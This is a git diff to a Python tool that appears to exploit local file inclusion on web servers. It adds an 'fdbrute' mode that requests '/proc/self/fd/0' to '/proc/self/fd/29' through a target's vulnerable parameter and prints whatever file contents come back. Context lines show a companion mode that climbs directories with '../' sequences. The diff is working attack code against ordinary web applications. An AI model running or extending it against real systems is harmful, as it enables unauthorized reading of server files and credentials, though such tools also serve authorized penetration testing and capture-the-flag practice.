@@ -24,6 +24,14 @@ def filefinder(url, filename, headers, errpage, args):
             print(f"    Response:\n{colored(req.text, 'cyan')}")
             break
         escape += "../"
+def fdbrute(url,errpage,args):
+    for i in range(30):
+        payload = '/proc/self/fd/'+str(i)
+        req = requests.get(url=url,headers=headers,params={args.param: payload})
+        if req.text != errpage.text:
+            print(colored("[+] FD FOUND: ", "green"))
+            print(colored(i, "green"))
+            print(colored(req.text, "green"))
 
 parser = argparse.ArgumentParser(description="Send a request with filename parameter")
 parser.add_argument("-u", "--url", required=True, help="Target URL")
@@ -51,6 +59,8 @@ elif args.mode == "filefinder":
         filefinder(url, filename, headers, errpage, args)
     else:
         print(colored("[-] Please provide a filename with -f", "red"))
+elif args.mode == 'fdbrute':
+    fdbrute(url,errpage,args)
 
 elif args.mode is None:
     if args.file:
